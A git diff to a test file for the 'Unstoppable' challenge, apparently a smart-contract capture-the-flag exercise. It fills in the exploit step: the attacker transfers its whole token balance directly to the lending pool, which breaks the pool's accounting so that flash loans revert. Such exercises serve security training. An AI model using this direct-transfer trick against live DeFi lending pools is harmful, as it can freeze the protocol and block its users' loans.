@@ -40,7 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        await this.token.transfer(this.pool.address, 0);
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
@@ -50,5 +50,6 @@ describe('[Challenge] Unstoppable', function () {
         await expect(
             this.receiverContract.executeFlashLoan(10)
         ).to.be.reverted;
+        expect(await this.token.balanceOf(attacker.address)).to.equal(0);
     });
 });
